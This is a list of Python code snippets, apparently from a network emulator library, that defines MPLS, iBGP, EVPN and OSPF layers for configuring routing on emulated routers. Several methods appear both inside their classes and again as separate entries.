  "def __setUpIbgpMesh(self, nodes: List[Router]):\n        \"\"\"!\n        @brief Setup IBGP full mesh.\n\n        @param node list of nodes.\n        \"\"\"\n\n        self._log('Setting up iBGP full mesh for edge nodes...')\n        for local in nodes:\n\n            n = 1\n            for remote in nodes:\n                if local == remote: continue\n\n                local.addTable('t_bgp')\n                local.addTablePipe('t_bgp')\n                local.addTablePipe('t_direct', 't_bgp')\n                local.addProtocol('bgp', 'ibgp{}'.format(n), MplsFileTemplates['bird_ibgp_peer'].format(\n                    localAddress = local.getLoopbackAddress(),\n                    peerAddress = remote.getLoopbackAddress(),\n                    asn = local.getAsn()\n                ))\n\n                n += 1",
  "def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        for asn in self.__enabled:\n            if reg.has('seedemu', 'layer', 'Ospf'):\n                self._log('Ospf layer exists, masking as{}'.format(asn))\n                ospf: Ospf = reg.get('seedemu', 'layer', 'Ospf')\n                ospf.maskAsn(asn)\n\n            if reg.has('seedemu', 'layer', 'Ibgp'):\n                self._log('Ibgp layer exists, masking as{}'.format(asn))\n                ibgp: Ibgp = reg.get('seedemu', 'layer', 'Ibgp')\n                ibgp.maskAsn(asn)\n\n            scope = ScopedRegistry(str(asn), reg)\n            (enodes, nodes) = self.__getEdgeNodes(scope)\n\n            for (asn_, nodename) in self.__additional_edges:\n                if asn_ != asn: continue\n                if scope.has('rnode', nodename):\n                    enodes.append(scope.get('rnode', nodename))\n\n            for n in enodes: self.__setUpLdpOspf(n)\n            for n in nodes: self.__setUpLdpOspf(n)\n            self.__setUpIbgpMesh(enodes)",
  "def _doCreateGraphs(self, emulator: Emulator):\n        base = emulator.getRegistry().get('seedemu', 'layer', 'Base')\n        for asn in base.getAsns():\n            if asn not in self.__enabled: continue\n            asobj = base.getAutonomousSystem(asn)\n            asobj.createGraphs(emulator)\n            l2graph = asobj.getGraph('AS{}: Layer 2 Connections'.format(asn))\n            mplsgraph = self._addGraph('AS{}: MPLS Topology'.format(asn), False)\n            mplsgraph.copy(l2graph)\n            for edge in mplsgraph.edges:\n                edge.style = 'dotted'\n\n            scope = ScopedRegistry(str(asn), emulator.getRegistry())\n            (enodes, _) = self.__getEdgeNodes(scope)\n            \n            while len(enodes) > 0:\n                a = enodes.pop()\n                for b in enodes:\n                    mplsgraph.addEdge('Router: {}'.format(a.getName()), 'Router: {}'.format(b.getName()), style = 'solid')",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'MplsLayer:\\n'\n        \n        indent += 4\n        out += ' ' * indent\n        out += 'Enabled on:\\n'\n\n        indent += 4\n        for asn in self.__enabled:\n            out += ' ' * indent\n            out += 'as{}\\n'.format(asn)\n\n        return out",
  "class Ibgp(Layer, Graphable):\n    \"\"\"!\n    @brief The Ibgp (iBGP) layer.\n\n    This layer automatically setup full mesh peering between routers within AS.\n    \"\"\"\n    __masked: Set[int]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Ibgp (iBGP) layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__masked = set()\n        self.addDependency('Ospf', False, False)\n\n    def __dfs(self, start: Node, visited: List[Node], netname: str = 'self'):\n        \"\"\"!\n        @brief do a DFS and find all local routers to setup IBGP.\n\n        @param start node to start from.\n        @param visited list to store nodes.\n        @param netname name of the net - for log only.\n        \"\"\"\n        if start in visited:\n            return\n        \n        self._log('found node: as{}/{} via {}'.format(start.getAsn(), start.getName(), netname))\n        visited.append(start)\n\n        for iface in start.getInterfaces():\n            net = iface.getNet()\n\n            if net.getType() != NetworkType.Local:\n                continue\n\n            neighs: List[Node] = net.getAssociations()\n\n            for neigh in neighs:\n\n                if neigh.getRole() != NodeRole.Router: \n                    continue\n                \n                self.__dfs(neigh, visited, net.getName())\n\n\n    def getName(self) -> str:\n        return 'Ibgp'\n\n    def maskAsn(self, asn: int) -> Ibgp:\n        \"\"\"!\n        @brief Mask an AS.\n\n        By default, Ibgp layer will add iBGP peering for all ASes. Use this\n        method to mask an AS and disable iBGP.\n\n        @param asn AS to mask.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__masked.add(asn)\n\n        return self\n    \n    def getMaskedAsns(self) -> Set[int]:\n        \"\"\"!\n        @brief Get set of masked ASNs.\n        \n        @return set of ASNs.\n        \"\"\"\n        return self.__masked\n\n    def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        base: Base = reg.get('seedemu', 'layer', 'Base')\n        for asn in base.getAsns():\n            if asn in self.__masked: continue\n\n            self._log('setting up IBGP peering for as{}...'.format(asn))\n            routers: List[Node] = ScopedRegistry(str(asn), reg).getByType('rnode')\n\n            for local in routers:\n                self._log('setting up IBGP peering on as{}/{}...'.format(asn, local.getName()))\n\n                remotes = []\n                self.__dfs(local, remotes)\n\n                n = 1\n                for remote in remotes:\n                    if local == remote: continue\n\n                    laddr = local.getLoopbackAddress()\n                    raddr = remote.getLoopbackAddress()\n                    local.addTable('t_bgp')\n                    local.addTablePipe('t_bgp')\n                    local.addTablePipe('t_direct', 't_bgp')\n                    local.addProtocol('bgp', 'ibgp{}'.format(n), IbgpFileTemplates['ibgp_peer'].format(\n                        localAddress = laddr,\n                        peerAddress = raddr,\n                        asn = asn\n                    ))\n\n                    n += 1\n\n                    self._log('adding peering: {} <-> {} (ibgp, as{})'.format(laddr, raddr, asn))\n\n    def _doCreateGraphs(self, emulator: Emulator):\n        base: Base = emulator.getRegistry().get('seedemu', 'layer', 'Base')\n        for asn in base.getAsns():\n            if asn in self.__masked: continue\n            asobj = base.getAutonomousSystem(asn)\n            asobj.createGraphs(emulator)\n            l2graph = asobj.getGraph('AS{}: Layer 2 Connections'.format(asn))\n            ibgpgraph = self._addGraph('AS{}: iBGP sessions'.format(asn), False)\n            ibgpgraph.copy(l2graph)\n            for edge in ibgpgraph.edges:\n                edge.style = 'dotted'\n\n            rtrs = ScopedRegistry(str(asn), emulator.getRegistry()).getByType('rnode').copy()\n            \n            while len(rtrs) > 0:\n                a = rtrs.pop()\n                for b in rtrs:\n                    ibgpgraph.addEdge('Router: {}'.format(a.getName()), 'Router: {}'.format(b.getName()), style = 'solid')\n            \n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'IbgpLayer:\\n'\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Masked ASes:\\n'\n\n        indent += 4\n        for asn in self.__masked:\n            out += ' ' * indent\n            out += '{}\\n'.format(asn)\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief Ibgp (iBGP) layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__masked = set()\n        self.addDependency('Ospf', False, False)",
  "def __dfs(self, start: Node, visited: List[Node], netname: str = 'self'):\n        \"\"\"!\n        @brief do a DFS and find all local routers to setup IBGP.\n\n        @param start node to start from.\n        @param visited list to store nodes.\n        @param netname name of the net - for log only.\n        \"\"\"\n        if start in visited:\n            return\n        \n        self._log('found node: as{}/{} via {}'.format(start.getAsn(), start.getName(), netname))\n        visited.append(start)\n\n        for iface in start.getInterfaces():\n            net = iface.getNet()\n\n            if net.getType() != NetworkType.Local:\n                continue\n\n            neighs: List[Node] = net.getAssociations()\n\n            for neigh in neighs:\n\n                if neigh.getRole() != NodeRole.Router: \n                    continue\n                \n                self.__dfs(neigh, visited, net.getName())",
  "def getName(self) -> str:\n        return 'Ibgp'",
  "def maskAsn(self, asn: int) -> Ibgp:\n        \"\"\"!\n        @brief Mask an AS.\n\n        By default, Ibgp layer will add iBGP peering for all ASes. Use this\n        method to mask an AS and disable iBGP.\n\n        @param asn AS to mask.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__masked.add(asn)\n\n        return self",
  "def getMaskedAsns(self) -> Set[int]:\n        \"\"\"!\n        @brief Get set of masked ASNs.\n        \n        @return set of ASNs.\n        \"\"\"\n        return self.__masked",
  "def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n        base: Base = reg.get('seedemu', 'layer', 'Base')\n        for asn in base.getAsns():\n            if asn in self.__masked: continue\n\n            self._log('setting up IBGP peering for as{}...'.format(asn))\n            routers: List[Node] = ScopedRegistry(str(asn), reg).getByType('rnode')\n\n            for local in routers:\n                self._log('setting up IBGP peering on as{}/{}...'.format(asn, local.getName()))\n\n                remotes = []\n                self.__dfs(local, remotes)\n\n                n = 1\n                for remote in remotes:\n                    if local == remote: continue\n\n                    laddr = local.getLoopbackAddress()\n                    raddr = remote.getLoopbackAddress()\n                    local.addTable('t_bgp')\n                    local.addTablePipe('t_bgp')\n                    local.addTablePipe('t_direct', 't_bgp')\n                    local.addProtocol('bgp', 'ibgp{}'.format(n), IbgpFileTemplates['ibgp_peer'].format(\n                        localAddress = laddr,\n                        peerAddress = raddr,\n                        asn = asn\n                    ))\n\n                    n += 1\n\n                    self._log('adding peering: {} <-> {} (ibgp, as{})'.format(laddr, raddr, asn))",
  "def _doCreateGraphs(self, emulator: Emulator):\n        base: Base = emulator.getRegistry().get('seedemu', 'layer', 'Base')\n        for asn in base.getAsns():\n            if asn in self.__masked: continue\n            asobj = base.getAutonomousSystem(asn)\n            asobj.createGraphs(emulator)\n            l2graph = asobj.getGraph('AS{}: Layer 2 Connections'.format(asn))\n            ibgpgraph = self._addGraph('AS{}: iBGP sessions'.format(asn), False)\n            ibgpgraph.copy(l2graph)\n            for edge in ibgpgraph.edges:\n                edge.style = 'dotted'\n\n            rtrs = ScopedRegistry(str(asn), emulator.getRegistry()).getByType('rnode').copy()\n            \n            while len(rtrs) > 0:\n                a = rtrs.pop()\n                for b in rtrs:\n                    ibgpgraph.addEdge('Router: {}'.format(a.getName()), 'Router: {}'.format(b.getName()), style = 'solid')",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'IbgpLayer:\\n'\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Masked ASes:\\n'\n\n        indent += 4\n        for asn in self.__masked:\n            out += ' ' * indent\n            out += '{}\\n'.format(asn)\n\n        return out",
  "class Evpn(Layer):\n    \"\"\"!\n    @brief The Evpn (Ethernet VPN) layer.\n\n    Work in progress. This layer add supports for BGP-singled EVPN. \n    \"\"\"\n\n    __customers: Set[Tuple[int, int, str, str, int]]\n    __providers: Set[int]\n\n    def __init__(self):\n        super().__init__()\n\n        # they are not really \"dependency,\" we just need them to render after\n        # us, in case we need to setup masks.\n        self.addDependency('Ospf', True, True)\n        self.addDependency('Ibgp', True, True)\n\n        self.addDependency('Routing', False, False)\n\n        self.__customers = set()\n        self.__providers = set()\n\n    def getName(self) -> str:\n        return 'Evpn'\n        \n    def configureAsEvpnProvider(self, asn: int):\n        '''!\n        @brief configure an AS to be EVPN provider; currently, making an EVPN\n        provider will exclude it from any IP-based network.\n\n        @param asn asn.\n        '''\n        self.__providers.add(asn)\n\n    def getEvpnProviders(self) -> Set[int]:\n        '''!\n        @brief get set of EVPN providers.\n        \n        @returns set of asns.\n        '''\n        return self.__providers\n\n    def addCustomer(self, providerAsn: int, customerAsn: int, customerNetworkName: str, providerRouterNodeName: str, vni: int):\n        '''!\n        @brief add a customer.\n\n        @param providerAsn provider ASN.\n        @param customerAsn customer ASN. If the target network is an internet\n        exchange, use 0 as asn.\n        @param customerNetworkName customer network name.\n        @param providerRouterNodeName name of the PE router node.\n        @param vni VNI.\n        '''\n        self.__customers.add((providerAsn, customerAsn, customerNetworkName, providerRouterNodeName, vni))\n\n    def getCustomers(self) -> Set[Tuple[int, int, str, str, int]]:\n        '''!\n        @brief Get set of customers.\n\n        @return set of (provider asn, customer asn, customer netname, pe node name)\n        '''\n        return self.__customers\n    \n    def __configureOspf(self, node: Router) -> str:\n        self._log('configuring OSPF on as{}/{}'.format(node.getAsn(), node.getName()))\n\n        ospf_ifaces = ''\n\n        for iface in node.getInterfaces():\n            net = iface.getNet()\n            if net.getType() == NetworkType.InternetExchange: continue\n            if not (True in (node.getRole() == NodeRole.Router for node in net.getAssociations())): continue\n\n            ospf_ifaces += EvpnFileTemplates['ospf_interface'].format(\n                interface = net.getName()\n            )\n\n            net.setMtu(9000)\n\n        return ospf_ifaces\n\n    def __configureIbgpMesh(self, local: Router, nodes: List[Router]) -> str:\n        self._log('configuring IBGP mesh on provider edge as{}/{}'.format(local.getAsn(), local.getName()))\n\n        neighbours = ''\n\n        for remote in nodes:\n            if local == remote: continue\n\n            neighbours += EvpnFileTemplates['bgp_neighbor'].format(\n                neighbourAddress = remote.getLoopbackAddress()\n            )\n\n        return neighbours\n\n    def __configureFrr(self, router: Router):\n        self._log('setting up FRR on as{}/{}'.format(router.getAsn(), router.getName()))\n\n        router.setFile('/frr_start', EvpnFileTemplates['frr_start_script'])\n        router.appendStartCommand('chmod +x /frr_start')\n        router.appendStartCommand('/frr_start')\n        router.addSoftware('frr')\n\n    def __configureProviderRouter(self, router: Router, peers: List[Router] = []):\n        self._log('configuring common properties for provider router as{}/{}'.format(router.getAsn(), router.getName()))\n\n        self.__configureFrr(router)\n\n        router.setFile('/etc/frr/frr.conf', EvpnFileTemplates['frr_config'].format(\n            ospfInterfaces = self.__configureOspf(router),\n            routerId = router.getLoopbackAddress(),\n            asn = router.getAsn(),\n            loopbackAddress = router.getLoopbackAddress(),\n            neighbours = self.__configureIbgpMesh(router, peers)\n        ))\n\n    def __configureProviderEdgeRouter(self, router: Router, customers: List[Tuple[int, str, int]]):\n        vxlan_ifaces = ''\n\n        vnis: Set[int] = set()\n\n        for (_, _, vni) in customers: vnis.add(vni)\n\n        self._log('creating vxlan interfaces on as{}/{}'.format(router.getAsn(), router.getName()))\n        for vni in vnis:\n            vxlan_ifaces += EvpnFileTemplates['vetp_bridge'].format(\n                name = vni,\n                vni = vni,\n                loopbackAddress = router.getLoopbackAddress()\n            )\n\n            router.appendStartCommand('ifup br-{}'.format(vni))\n            router.appendStartCommand('ifup vtep-{}'.format(vni))\n        \n        router.setFile('/etc/network/interfaces.d/vxlan_interfaces', vxlan_ifaces)\n\n        # todo: bridge to customer's network\n\n    def __configureAutonomousSystem(self, asn: int, reg: Registry):\n        self._log('configuring as{}'.format(asn))\n\n        customers: List[Tuple[int, str, str, int]] = []\n\n        routers: List[Router] = []\n        pe: List[Router] = []\n        p: List[Router] = []\n\n        for r in ScopedRegistry(str(asn), reg).getByType('rnode'):\n            routers.append(r)\n\n        self._log('collecting customers of as{}'.format(asn))\n        for (pasn, casn, cn, prn, vni) in self.__customers:\n            if pasn != asn: continue\n            customers.append((casn, cn, prn, vni))\n\n        self._log('classifying p/pe for as{}'.format(asn))\n        for r in routers:\n            is_edge = False\n\n            for (_, _, prn, _) in customers:\n                if r.getName() == prn:\n                    is_edge = True\n                    break\n            \n            if is_edge: pe.append(r)\n            else: p.append(r)\n\n        self._log('configuring p routers for as{}'.format(asn))\n        for router in p: self.__configureProviderRouter(router)\n\n        self._log('configuring pe routers for as{}'.format(asn))\n        for router in pe:\n            self._log('collection customers connected to as{}/{}'.format(asn, router.getName()))\n\n            this_customers: List[Tuple[int, str, int]] = []\n\n            for (casn, cn, prn, vni) in customers:\n                if prn != router.getName(): continue\n                this_customers.append((casn, cn, vni))\n            \n            self.__configureProviderRouter(router, pe)\n            self.__configureProviderEdgeRouter(router, this_customers)\n\n    def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        asns: Set[int] = set()\n\n        for (asn, _, _, _, _) in self.__customers: asns.add(asn)\n\n        for asn in self.asns:\n            if reg.has('seedemu', 'layer', 'Ospf'):\n                self._log('Ospf layer exists, masking as{}'.format(asn))\n                ospf: Ospf = reg.get('seedemu', 'layer', 'Ospf')\n                ospf.maskAsn(asn)\n\n            if reg.has('seedemu', 'layer', 'Ibgp'):\n                self._log('Ibgp layer exists, masking as{}'.format(asn))\n                ibgp: Ibgp = reg.get('seedemu', 'layer', 'Ibgp')\n                ibgp.maskAsn(asn)\n\n            self.__configureAutonomousSystem(asn, reg)",
  "def __init__(self):\n        super().__init__()\n\n        # they are not really \"dependency,\" we just need them to render after\n        # us, in case we need to setup masks.\n        self.addDependency('Ospf', True, True)\n        self.addDependency('Ibgp', True, True)\n\n        self.addDependency('Routing', False, False)\n\n        self.__customers = set()\n        self.__providers = set()",
  "def getName(self) -> str:\n        return 'Evpn'",
  "def configureAsEvpnProvider(self, asn: int):\n        '''!\n        @brief configure an AS to be EVPN provider; currently, making an EVPN\n        provider will exclude it from any IP-based network.\n\n        @param asn asn.\n        '''\n        self.__providers.add(asn)",
  "def getEvpnProviders(self) -> Set[int]:\n        '''!\n        @brief get set of EVPN providers.\n        \n        @returns set of asns.\n        '''\n        return self.__providers",
  "def addCustomer(self, providerAsn: int, customerAsn: int, customerNetworkName: str, providerRouterNodeName: str, vni: int):\n        '''!\n        @brief add a customer.\n\n        @param providerAsn provider ASN.\n        @param customerAsn customer ASN. If the target network is an internet\n        exchange, use 0 as asn.\n        @param customerNetworkName customer network name.\n        @param providerRouterNodeName name of the PE router node.\n        @param vni VNI.\n        '''\n        self.__customers.add((providerAsn, customerAsn, customerNetworkName, providerRouterNodeName, vni))",
  "def getCustomers(self) -> Set[Tuple[int, int, str, str, int]]:\n        '''!\n        @brief Get set of customers.\n\n        @return set of (provider asn, customer asn, customer netname, pe node name)\n        '''\n        return self.__customers",
  "def __configureOspf(self, node: Router) -> str:\n        self._log('configuring OSPF on as{}/{}'.format(node.getAsn(), node.getName()))\n\n        ospf_ifaces = ''\n\n        for iface in node.getInterfaces():\n            net = iface.getNet()\n            if net.getType() == NetworkType.InternetExchange: continue\n            if not (True in (node.getRole() == NodeRole.Router for node in net.getAssociations())): continue\n\n            ospf_ifaces += EvpnFileTemplates['ospf_interface'].format(\n                interface = net.getName()\n            )\n\n            net.setMtu(9000)\n\n        return ospf_ifaces",
  "def __configureIbgpMesh(self, local: Router, nodes: List[Router]) -> str:\n        self._log('configuring IBGP mesh on provider edge as{}/{}'.format(local.getAsn(), local.getName()))\n\n        neighbours = ''\n\n        for remote in nodes:\n            if local == remote: continue\n\n            neighbours += EvpnFileTemplates['bgp_neighbor'].format(\n                neighbourAddress = remote.getLoopbackAddress()\n            )\n\n        return neighbours",
  "def __configureFrr(self, router: Router):\n        self._log('setting up FRR on as{}/{}'.format(router.getAsn(), router.getName()))\n\n        router.setFile('/frr_start', EvpnFileTemplates['frr_start_script'])\n        router.appendStartCommand('chmod +x /frr_start')\n        router.appendStartCommand('/frr_start')\n        router.addSoftware('frr')",
  "def __configureProviderRouter(self, router: Router, peers: List[Router] = []):\n        self._log('configuring common properties for provider router as{}/{}'.format(router.getAsn(), router.getName()))\n\n        self.__configureFrr(router)\n\n        router.setFile('/etc/frr/frr.conf', EvpnFileTemplates['frr_config'].format(\n            ospfInterfaces = self.__configureOspf(router),\n            routerId = router.getLoopbackAddress(),\n            asn = router.getAsn(),\n            loopbackAddress = router.getLoopbackAddress(),\n            neighbours = self.__configureIbgpMesh(router, peers)\n        ))",
  "def __configureProviderEdgeRouter(self, router: Router, customers: List[Tuple[int, str, int]]):\n        vxlan_ifaces = ''\n\n        vnis: Set[int] = set()\n\n        for (_, _, vni) in customers: vnis.add(vni)\n\n        self._log('creating vxlan interfaces on as{}/{}'.format(router.getAsn(), router.getName()))\n        for vni in vnis:\n            vxlan_ifaces += EvpnFileTemplates['vetp_bridge'].format(\n                name = vni,\n                vni = vni,\n                loopbackAddress = router.getLoopbackAddress()\n            )\n\n            router.appendStartCommand('ifup br-{}'.format(vni))\n            router.appendStartCommand('ifup vtep-{}'.format(vni))\n        \n        router.setFile('/etc/network/interfaces.d/vxlan_interfaces', vxlan_ifaces)",
  "def __configureAutonomousSystem(self, asn: int, reg: Registry):\n        self._log('configuring as{}'.format(asn))\n\n        customers: List[Tuple[int, str, str, int]] = []\n\n        routers: List[Router] = []\n        pe: List[Router] = []\n        p: List[Router] = []\n\n        for r in ScopedRegistry(str(asn), reg).getByType('rnode'):\n            routers.append(r)\n\n        self._log('collecting customers of as{}'.format(asn))\n        for (pasn, casn, cn, prn, vni) in self.__customers:\n            if pasn != asn: continue\n            customers.append((casn, cn, prn, vni))\n\n        self._log('classifying p/pe for as{}'.format(asn))\n        for r in routers:\n            is_edge = False\n\n            for (_, _, prn, _) in customers:\n                if r.getName() == prn:\n                    is_edge = True\n                    break\n            \n            if is_edge: pe.append(r)\n            else: p.append(r)\n\n        self._log('configuring p routers for as{}'.format(asn))\n        for router in p: self.__configureProviderRouter(router)\n\n        self._log('configuring pe routers for as{}'.format(asn))\n        for router in pe:\n            self._log('collection customers connected to as{}/{}'.format(asn, router.getName()))\n\n            this_customers: List[Tuple[int, str, int]] = []\n\n            for (casn, cn, prn, vni) in customers:\n                if prn != router.getName(): continue\n                this_customers.append((casn, cn, vni))\n            \n            self.__configureProviderRouter(router, pe)\n            self.__configureProviderEdgeRouter(router, this_customers)",
  "def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        asns: Set[int] = set()\n\n        for (asn, _, _, _, _) in self.__customers: asns.add(asn)\n\n        for asn in self.asns:\n            if reg.has('seedemu', 'layer', 'Ospf'):\n                self._log('Ospf layer exists, masking as{}'.format(asn))\n                ospf: Ospf = reg.get('seedemu', 'layer', 'Ospf')\n                ospf.maskAsn(asn)\n\n            if reg.has('seedemu', 'layer', 'Ibgp'):\n                self._log('Ibgp layer exists, masking as{}'.format(asn))\n                ibgp: Ibgp = reg.get('seedemu', 'layer', 'Ibgp')\n                ibgp.maskAsn(asn)\n\n            self.__configureAutonomousSystem(asn, reg)",
  "class Ospf(Layer):\n    \"\"\"!\n    @brief Ospf (OSPF) layer.\n\n    @todo allow mask as\n\n    This layer enables OSPF on all router nodes. By default, this will make all\n    internal network interfaces (interfaces that are connected to a network\n    created by BaseLayer::createNetwork) OSPF interface. Other interfaces like\n    the IX interface will also be added as stub interface.\n    \"\"\"\n\n    __stubs: Set[Tuple[int, str]]\n    __masked: Set[Tuple[int, str]]\n    __masked_asn: Set[int]\n\n    def __init__(self):\n        \"\"\"!\n        @brief Ospf (OSPF) layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__stubs = set()\n        self.__masked = set()\n        self.__masked_asn = set()\n\n        self.addDependency('Routing', False, False)\n\n    def getName(self) -> str:\n        return 'Ospf'\n\n    def markAsStub(self, asn: int, netname: str) -> Ospf:\n        \"\"\"!\n        @brief Set all OSPF interfaces connected to a network as stub\n        interfaces.\n\n        By default, all internal networks will be active OSPF interface. This\n        method can be used to override the behavior and make the interface\n        stub interface (i.e., passive). For example, you can mark host-only \n        internal networks as a stub.\n\n        @param asn ASN to operate on.\n        @param netname name of the network.\n        @returns self, for chaining API calls.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__stubs.add((asn, netname))\n\n        return self\n\n    def getStubs(self) -> Set[Tuple[int, str]]:\n        \"\"\"!\n        @brief Get set of networks that have been marked as stub.\n\n        @returns set of tuple of asn and netname\n        \"\"\"\n        return self.__stubs\n\n    def maskNetwork(self, asn: int, netname: str) -> Ospf:\n        \"\"\"!\n        @brief Remove all OSPF interfaces connected to a network.\n\n        By default, all internal networks will be active OSPF interface. Use\n        this method to mask a network and disable OSPF on all connected\n        interface.\n\n        @todo handle IX LAN masking?\n\n        @param asn asn of the net.\n        @param netname name of the net.\n        \n        @throws AssertionError if network is not local.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__masked.add((asn, netname))\n\n        return self\n\n    def getMaskedNetworks(self) -> Set[Tuple[int, str]]:\n        \"\"\"!\n        @brief Get set of masked network.\n\n        @returns set of tuple of asn and netname\n        \"\"\"\n        return self.__masked\n\n    def maskAsn(self, asn: int) -> Ospf:\n        \"\"\"!\n        @brief Disable OSPF for an AS.\n\n        @param asn asn.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__masked_asn.add(asn)\n\n        return self\n\n    def getMaskedAsns(self) -> Set[int]:\n        \"\"\"!\n        @brief Get list of masked ASNs.\n\n        @returns set of ASNs.\n        \"\"\"\n        return self.__masked_asn\n\n    def isMasked(self, asn: int, netname: str) -> bool:\n        \"\"\"!\n        @brief Test if a network is masked.\n\n        @param asn to test.\n        @param netname net name in the given as.\n        \n        @returns if net is masked.\n        \"\"\"\n        return (asn, netname) in self.__masked\n\n    def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type != 'rnode': continue\n            router: Node = obj\n            if router.getAsn() in self.__masked_asn: continue\n\n            stubs: List[str] = ['dummy0']\n            active: List[str] = []\n\n            self._log('setting up OSPF for router as{}/{}...'.format(scope, name))\n            for iface in router.getInterfaces():\n                net = iface.getNet()\n\n                if (int(scope), net.getName()) in self.__masked: continue\n\n                if (int(scope), net.getName()) in self.__stubs or net.getType() != NetworkType.Local:\n                    stubs.append(net.getName())\n                    continue\n\n                active.append(net.getName())\n            \n            ospf_interfaces = ''\n            for name in stubs: ospf_interfaces += OspfFileTemplates['ospf_stub_interface'].format(\n                interfaceName = name\n            )\n            for name in active: ospf_interfaces += OspfFileTemplates['ospf_interface'].format(\n                interfaceName = name\n            )\n\n            if ospf_interfaces != '':\n                router.addTable('t_ospf')\n                router.addProtocol('ospf', 'ospf1', OspfFileTemplates['ospf_body'].format(\n                    interfaces = ospf_interfaces\n                ))\n                router.addTablePipe('t_ospf')\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'OspfLayer:\\n'\n\n        indent += 4\n\n        out += ' ' * indent\n        out += 'Stub Networks:\\n'\n        indent += 4\n        for (scope, netname) in self.__stubs:\n            out += ' ' * indent\n            out += 'as{}/{}\\n'.format(scope, netname)\n        indent -= 4\n\n        out += ' ' * indent\n        out += 'Masked Networks:\\n'\n        indent += 4\n        for (scope, netname) in self.__masked:\n            out += ' ' * indent\n            out += 'as{}/{}\\n'.format(scope, netname)\n        indent -= 4\n\n        out += ' ' * indent\n        out += 'Masked AS:\\n'\n        indent += 4\n        for asn in self.__masked_asn:\n            out += ' ' * indent\n            out += 'as{}\\n'.format(asn)\n\n        return out",
  "def __init__(self):\n        \"\"\"!\n        @brief Ospf (OSPF) layer constructor.\n        \"\"\"\n        super().__init__()\n        self.__stubs = set()\n        self.__masked = set()\n        self.__masked_asn = set()\n\n        self.addDependency('Routing', False, False)",
  "def getName(self) -> str:\n        return 'Ospf'",
  "def markAsStub(self, asn: int, netname: str) -> Ospf:\n        \"\"\"!\n        @brief Set all OSPF interfaces connected to a network as stub\n        interfaces.\n\n        By default, all internal networks will be active OSPF interface. This\n        method can be used to override the behavior and make the interface\n        stub interface (i.e., passive). For example, you can mark host-only \n        internal networks as a stub.\n\n        @param asn ASN to operate on.\n        @param netname name of the network.\n        @returns self, for chaining API calls.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__stubs.add((asn, netname))\n\n        return self",
  "def getStubs(self) -> Set[Tuple[int, str]]:\n        \"\"\"!\n        @brief Get set of networks that have been marked as stub.\n\n        @returns set of tuple of asn and netname\n        \"\"\"\n        return self.__stubs",
  "def maskNetwork(self, asn: int, netname: str) -> Ospf:\n        \"\"\"!\n        @brief Remove all OSPF interfaces connected to a network.\n\n        By default, all internal networks will be active OSPF interface. Use\n        this method to mask a network and disable OSPF on all connected\n        interface.\n\n        @todo handle IX LAN masking?\n\n        @param asn asn of the net.\n        @param netname name of the net.\n        \n        @throws AssertionError if network is not local.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__masked.add((asn, netname))\n\n        return self",
  "def getMaskedNetworks(self) -> Set[Tuple[int, str]]:\n        \"\"\"!\n        @brief Get set of masked network.\n\n        @returns set of tuple of asn and netname\n        \"\"\"\n        return self.__masked",
  "def maskAsn(self, asn: int) -> Ospf:\n        \"\"\"!\n        @brief Disable OSPF for an AS.\n\n        @param asn asn.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__masked_asn.add(asn)\n\n        return self",
  "def getMaskedAsns(self) -> Set[int]:\n        \"\"\"!\n        @brief Get list of masked ASNs.\n\n        @returns set of ASNs.\n        \"\"\"\n        return self.__masked_asn",
  "def isMasked(self, asn: int, netname: str) -> bool:\n        \"\"\"!\n        @brief Test if a network is masked.\n\n        @param asn to test.\n        @param netname net name in the given as.\n        \n        @returns if net is masked.\n        \"\"\"\n        return (asn, netname) in self.__masked",
  "def render(self, emulator: Emulator):\n        reg = emulator.getRegistry()\n\n        for ((scope, type, name), obj) in reg.getAll().items():\n            if type != 'rnode': continue\n            router: Node = obj\n            if router.getAsn() in self.__masked_asn: continue\n\n            stubs: List[str] = ['dummy0']\n            active: List[str] = []\n\n            self._log('setting up OSPF for router as{}/{}...'.format(scope, name))\n            for iface in router.getInterfaces():\n                net = iface.getNet()\n\n                if (int(scope), net.getName()) in self.__masked: continue\n\n                if (int(scope), net.getName()) in self.__stubs or net.getType() != NetworkType.Local:\n                    stubs.append(net.getName())\n                    continue\n\n                active.append(net.getName())\n            \n            ospf_interfaces = ''\n            for name in stubs: ospf_interfaces += OspfFileTemplates['ospf_stub_interface'].format(\n                interfaceName = name\n            )\n            for name in active: ospf_interfaces += OspfFileTemplates['ospf_interface'].format(\n                interfaceName = name\n            )\n\n            if ospf_interfaces != '':\n                router.addTable('t_ospf')\n                router.addProtocol('ospf', 'ospf1', OspfFileTemplates['ospf_body'].format(\n                    interfaces = ospf_interfaces\n                ))\n                router.addTablePipe('t_ospf')",
